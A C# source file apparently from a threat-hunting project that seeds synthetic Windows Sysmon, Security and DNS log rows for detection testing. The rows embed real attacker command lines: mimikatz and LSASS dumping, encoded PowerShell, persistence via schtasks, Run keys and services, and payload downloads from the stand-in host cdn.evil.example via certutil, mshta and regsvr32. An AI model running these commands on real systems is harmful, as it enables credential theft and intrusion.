namespace Hunting.Data;

/// <summary>
/// Seeds deterministic Phase 1A medallion development data into the active Bronze
/// source-family tables.
/// </summary>
public static class MockDataSeeder
{
    private const string WindowsSysmonTable = "bronze.windows_sysmon_event";
    private const string WindowsSecurityTable = "bronze.windows_security_event";
    private const string DnsServerTable = "bronze.dns_server_event";

    private static readonly IReadOnlyDictionary<string, long> ExpectedRowsByTable =
        new Dictionary<string, long>(StringComparer.OrdinalIgnoreCase)
        {
            [WindowsSysmonTable] = 32,
            [WindowsSecurityTable] = 4,
            [DnsServerTable] = 3
        };

    public static IReadOnlyList<SeedFixtureBatch> GetMedallionSeedFixtureBatches(
        string? catalogVersion = null)
    {
        var sourceNameByTable = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            ["bronze.windows_sysmon_event"] = "Windows Sysmon",
            ["bronze.windows_security_event"] = "Windows Security",
            ["bronze.dns_server_event"] = "DNS Server"
        };

        return SeedFixtureBatchFactory.FromTableSeedSql(
            GetMedallionSeedSqlByTable(),
            GetExpectedMedallionRowCountsByTable(),
            sourceNameByTable,
            scenario: "development.baseline",
            catalogVersion: catalogVersion);
    }

    public static IReadOnlyDictionary<string, long> GetExpectedMedallionRowCountsByTable() =>
        ExpectedRowsByTable;

    public static IReadOnlyDictionary<string, string> GetMedallionSeedSqlByTable() =>
        new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            [WindowsSysmonTable] = GetWindowsSysmonSeedSql(),
            [WindowsSecurityTable] = GetWindowsSecuritySeedSql(),
            [DnsServerTable] = GetDnsServerSeedSql()
        };

    public static string GetMedallionSeedSql() =>
        string.Join("\n\n", GetMedallionSeedSqlByTable().Values.Select(EnsureStatementTerminated));

    public static string GetWindowsSysmonSeedSql() =>
        EnsureStatementTerminated("""
INSERT INTO bronze.windows_sysmon_event (ingest_time, source_name, provider, host, raw_log, raw_text) VALUES
(TIMESTAMP '2024-06-15 08:00:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-001', CAST('{"EventID":"1","EventRecordID":"1001","Image":"C:\\Windows\\explorer.exe","CommandLine":"explorer.exe","User":"CORP\\alice","ProcessId":"1000","ParentImage":"C:\\Windows\\System32\\userinit.exe","ParentCommandLine":"userinit.exe","Hashes":"SHA256=proc1001"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 08:01:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-001', CAST('{"EventID":"1","EventRecordID":"1002","Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd /c whoami /all","User":"CORP\\alice","ProcessId":"1001","ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"explorer.exe","Hashes":"SHA256=proc1002"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 08:02:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-001', CAST('{"EventID":"1","EventRecordID":"1003","Image":"C:\\Program Files\\Microsoft Office\\WINWORD.EXE","CommandLine":"WINWORD.EXE /n report.docx","User":"CORP\\alice","ProcessId":"1200","ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"explorer.exe","Hashes":"SHA256=proc1003"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 09:00:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-001', CAST('{"EventID":"1","EventRecordID":"1101","Image":"C:\\Windows\\System32\\whoami.exe","CommandLine":"whoami /all","User":"CORP\\alice","ProcessId":"1300","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=proc1101"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 09:00:30', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-001', CAST('{"EventID":"1","EventRecordID":"1102","Image":"C:\\Windows\\System32\\net.exe","CommandLine":"net user /domain","User":"CORP\\alice","ProcessId":"1301","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=proc1102"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 09:01:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-001', CAST('{"EventID":"1","EventRecordID":"1103","Image":"C:\\Windows\\System32\\ipconfig.exe","CommandLine":"ipconfig /all","User":"CORP\\alice","ProcessId":"1302","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=proc1103"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 09:01:30', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-001', CAST('{"EventID":"1","EventRecordID":"1104","Image":"C:\\Windows\\System32\\nltest.exe","CommandLine":"nltest /dclist:corp.local","User":"CORP\\alice","ProcessId":"1303","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=proc1104"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 10:00:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-001', CAST('{"EventID":"1","EventRecordID":"1201","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -ep bypass -file C:\\temp\\script.ps1","User":"CORP\\alice","ProcessId":"1400","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=proc1201"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 10:00:05', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-002', CAST('{"EventID":"1","EventRecordID":"1202","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -enc SQBFAFgA","User":"CORP\\bob","ProcessId":"2100","ParentImage":"C:\\Windows\\System32\\mshta.exe","ParentCommandLine":"mshta vbscript:Execute","Hashes":"SHA256=proc1202"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 10:00:10', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-002', CAST('{"EventID":"1","EventRecordID":"1203","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -NoP -W Hidden -EncodedCommand SQBmACgA","User":"CORP\\bob","ProcessId":"2101","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=proc1203"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 11:00:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'DC-001', CAST('{"EventID":"1","EventRecordID":"1301","Image":"C:\\tools\\mimikatz.exe","CommandLine":"mimikatz.exe privilege::debug sekurlsa::logonpasswords","User":"CORP\\admin","ProcessId":"3000","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=proc1301"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 11:01:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'DC-001', CAST('{"EventID":"1","EventRecordID":"1302","Image":"C:\\Windows\\System32\\rundll32.exe","CommandLine":"rundll32.exe comsvcs.dll MiniDump 624 C:\\temp\\lsass.dmp full","User":"CORP\\admin","ProcessId":"3001","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=proc1302"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 11:02:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-004', CAST('{"EventID":"1","EventRecordID":"1303","Image":"C:\\Windows\\System32\\procdump.exe","CommandLine":"procdump.exe -accepteula -ma lsass.exe C:\\temp\\lsass_2.dmp","User":"CORP\\admin","ProcessId":"4100","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=proc1303"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 12:00:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-003', CAST('{"EventID":"1","EventRecordID":"1401","Image":"C:\\Windows\\System32\\wmic.exe","CommandLine":"wmic /node:WS-004 process call create c:\\temp\\payload.exe","User":"CORP\\admin","ProcessId":"4001","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=proc1401"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 13:00:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-001', CAST('{"EventID":"1","EventRecordID":"1501","Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks /create /tn Updater /tr C:\\temp\\backdoor.exe /sc daily","User":"CORP\\alice","ProcessId":"1500","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=proc1501"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 13:01:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-001', CAST('{"EventID":"1","EventRecordID":"1502","Image":"C:\\Windows\\System32\\reg.exe","CommandLine":"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\temp\\backdoor.exe","User":"CORP\\alice","ProcessId":"1501","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=proc1502"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 13:02:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-004', CAST('{"EventID":"1","EventRecordID":"1503","Image":"C:\\Windows\\System32\\sc.exe","CommandLine":"sc create UpdaterSvc binPath= C:\\temp\\beacon.exe start= auto","User":"CORP\\admin","ProcessId":"4101","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=proc1503"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 13:03:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-004', CAST('{"EventID":"1","EventRecordID":"1504","Image":"C:\\Windows\\System32\\at.exe","CommandLine":"at 23:45 /every:M,T,W,Th,F C:\\temp\\beacon.exe","User":"CORP\\admin","ProcessId":"4102","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=proc1504"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 13:04:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-002', CAST('{"EventID":"1","EventRecordID":"1601","Image":"C:\\Windows\\System32\\regsvr32.exe","CommandLine":"regsvr32 /s /n /u /i:https://cdn.evil.example/file.sct scrobj.dll","User":"CORP\\bob","ProcessId":"4201","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=proc1601"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 13:05:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-002', CAST('{"EventID":"1","EventRecordID":"1602","Image":"C:\\Windows\\System32\\mshta.exe","CommandLine":"mshta.exe https://cdn.evil.example/update.hta","User":"CORP\\bob","ProcessId":"4202","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=proc1602"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 13:06:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-002', CAST('{"EventID":"1","EventRecordID":"1603","Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -urlcache -split -f https://cdn.evil.example/payload.bin C:\\temp\\payload.bin","User":"CORP\\bob","ProcessId":"4203","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=proc1603"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 12:00:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-003', CAST('{"EventID":"3","EventRecordID":"2001","SourceIp":"10.0.1.23","SourcePort":"51514","DestinationIp":"10.0.2.10","DestinationPort":"445","Protocol":"tcp","Image":"C:\\Windows\\System32\\wmic.exe","ProcessId":"4001","User":"CORP\\admin","Hashes":"SHA256=net2001","DestinationHostname":"FS-001.corp.local"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 14:00:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-001', CAST('{"EventID":"3","EventRecordID":"2002","SourceIp":"10.0.1.20","SourcePort":"51444","DestinationIp":"203.0.113.50","DestinationPort":"443","Protocol":"tcp","Image":"C:\\temp\\beacon.exe","ProcessId":"1600","User":"CORP\\alice","Hashes":"SHA256=net2002","DestinationHostname":"c2.example.test"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 14:05:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-002', CAST('{"EventID":"3","EventRecordID":"2003","SourceIp":"10.0.1.21","SourcePort":"52000","DestinationIp":"203.0.113.77","DestinationPort":"4444","Protocol":"tcp","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessId":"2200","User":"CORP\\bob","Hashes":"SHA256=net2003","DestinationHostname":"listener.example.test"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 14:06:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-002', CAST('{"EventID":"3","EventRecordID":"2004","SourceIp":"10.0.1.21","SourcePort":"52001","DestinationIp":"10.0.0.53","DestinationPort":"53","Protocol":"udp","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessId":"2200","User":"CORP\\bob","Hashes":"SHA256=net2004","DestinationHostname":"dns.corp.local"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 15:00:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-005', CAST('{"EventID":"3","EventRecordID":"2101","SourceIp":"10.0.1.25","SourcePort":"53001","DestinationIp":"203.0.113.60","DestinationPort":"443","Protocol":"tcp","Image":"C:\\temp\\beacon.exe","ProcessId":"5001","User":"CORP\\svc","Hashes":"SHA256=net2101"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 15:01:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-005', CAST('{"EventID":"3","EventRecordID":"2102","SourceIp":"10.0.1.25","SourcePort":"53002","DestinationIp":"203.0.113.60","DestinationPort":"8443","Protocol":"tcp","Image":"C:\\temp\\beacon.exe","ProcessId":"5001","User":"CORP\\svc","Hashes":"SHA256=net2102"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 15:02:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-005', CAST('{"EventID":"3","EventRecordID":"2103","SourceIp":"10.0.1.25","SourcePort":"53003","DestinationIp":"203.0.113.60","DestinationPort":"8080","Protocol":"tcp","Image":"C:\\temp\\beacon.exe","ProcessId":"5001","User":"CORP\\svc","Hashes":"SHA256=net2103"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 15:03:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-005', CAST('{"EventID":"3","EventRecordID":"2104","SourceIp":"10.0.1.25","SourcePort":"53004","DestinationIp":"203.0.113.60","DestinationPort":"443","Protocol":"tcp","Image":"C:\\temp\\beacon.exe","ProcessId":"5001","User":"CORP\\svc","Hashes":"SHA256=net2104"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 09:30:00', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-001', CAST('{"EventID":"22","EventRecordID":"3001","QueryName":"login.microsoftonline.com","QueryStatus":"0","QueryResults":"20.190.160.12;20.190.160.13"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 14:00:05', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-001', CAST('{"EventID":"22","EventRecordID":"3002","QueryName":"c2.example.test","QueryStatus":"0","QueryResults":"203.0.113.50"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 14:01:05', 'windows-sysmon', 'Microsoft-Windows-Sysmon', 'WS-002', CAST('{"EventID":"22","EventRecordID":"3003","QueryName":"blocked.example.test","QueryStatus":"NXDOMAIN","QueryResults":""}' AS JSON), '');
""");

    public static string GetWindowsSecuritySeedSql() =>
        EnsureStatementTerminated("""
INSERT INTO bronze.windows_security_event (ingest_time, source_name, provider, host, raw_log, raw_text) VALUES
(TIMESTAMP '2024-06-15 08:05:00', 'windows-security', 'Microsoft-Windows-Security-Auditing', 'WS-001', CAST('{"EventID":"4688","EventRecordID":"4001","NewProcessName":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd /c whoami /all","SubjectUserName":"alice","ParentProcessName":"C:\\Windows\\explorer.exe","NewProcessId":"0x514"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 10:00:10', 'windows-security', 'Microsoft-Windows-Security-Auditing', 'WS-002', CAST('{"EventID":"4688","EventRecordID":"4002","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -enc SQBFAFgA","SubjectUserName":"bob","ParentProcessName":"C:\\Windows\\System32\\cmd.exe","NewProcessId":"0x835"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 12:00:05', 'windows-security', 'Microsoft-Windows-Security-Auditing', 'WS-003', CAST('{"EventID":"5156","EventRecordID":"5001","SourceAddress":"10.0.1.23","SourcePort":"51514","DestAddress":"10.0.2.10","DestPort":"445","Protocol":"6","Application":"C:\\Windows\\System32\\wmic.exe"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 14:00:05', 'windows-security', 'Microsoft-Windows-Security-Auditing', 'WS-001', CAST('{"EventID":"5156","EventRecordID":"5002","SourceAddress":"10.0.1.20","SourcePort":"51444","DestAddress":"203.0.113.50","DestPort":"443","Protocol":"6","Application":"C:\\temp\\beacon.exe"}' AS JSON), '');
""");

    public static string GetDnsServerSeedSql() =>
        EnsureStatementTerminated("""
INSERT INTO bronze.dns_server_event (ingest_time, source_name, provider, host, raw_log, raw_text) VALUES
(TIMESTAMP '2024-06-15 09:30:00', 'dns-server', 'Technitium DNS Server', 'DNS-001', CAST('{"opcode":"QUERY","query_name":"login.microsoftonline.com","query_type":"A","response_code":"NOERROR","response_name":"login.microsoftonline.com","response_ip":"20.190.160.12","client_ip":"10.0.1.20","protocol":"udp"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 14:00:05', 'dns-server', 'Technitium DNS Server', 'DNS-001', CAST('{"opcode":"QUERY","query_name":"c2.example.test","query_type":"A","response_code":"NOERROR","response_name":"c2.example.test","response_ip":"203.0.113.50","client_ip":"10.0.1.20","protocol":"udp"}' AS JSON), ''),
(TIMESTAMP '2024-06-15 14:01:00', 'dns-server', 'Technitium DNS Server', 'DNS-001', CAST('{"opcode":"QUERY","query_name":"blocked.example.test","query_type":"A","response_code":"NXDOMAIN","response_name":"blocked.example.test","response_ip":"","client_ip":"10.0.1.21","protocol":"udp"}' AS JSON), '');
""");

    private static string EnsureStatementTerminated(string sql)
    {
        var trimmed = sql.Trim();
        return trimmed.EndsWith(";", StringComparison.Ordinal) ? trimmed : trimmed + ";";
    }
}